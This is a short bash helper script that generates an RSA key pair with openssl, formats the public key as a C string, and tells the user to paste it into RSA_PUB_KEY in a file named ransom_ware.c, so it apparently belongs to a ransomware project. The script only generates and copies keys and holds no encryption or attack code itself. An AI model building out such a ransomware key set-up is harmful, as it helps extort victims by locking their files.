#!/bin/bash
openssl genpkey -algorithm RSA -out private.pem -pkeyopt rsa_keygen_bits:2048 2>/dev/null
openssl rsa -pubout -in private.pem -out public.pem 2>/dev/null
echo "[+] RSA key pair generated."

FORMATTED_PUBLIC_KEY=$(cat public.pem | sed 's/$/\\n" \\/' | sed 's/^/"/' | sed '$ s/ \\//')

echo "[+] Copy this to RSA_PUB_KEY in ransom_ware.c:"
echo "------------------------------------"
echo "$FORMATTED_PUBLIC_KEY"
echo "------------------------------------"

echo -n "$FORMATTED_PUBLIC_KEY" | xclip -selection clipboard
echo "[*] Formatted public key has been copied to clipboard!"